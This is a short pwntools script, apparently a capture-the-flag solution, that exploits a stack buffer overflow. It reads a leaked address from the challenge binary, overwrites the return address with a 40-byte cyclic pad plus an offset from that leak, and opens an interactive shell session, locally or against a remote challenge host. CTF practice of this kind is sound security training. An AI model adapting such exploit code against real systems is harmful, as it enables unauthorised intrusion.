from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 22287)
    else:
        return process(e.path)


p = start()
p.recvuntil(b'?')
leak = int(p.recvline().strip(b'\n').strip(b' '), 16)
log.info("Leak %s" % hex(leak))
p.sendline(cyclic(40)+p64(leak+38))
p.interactive()
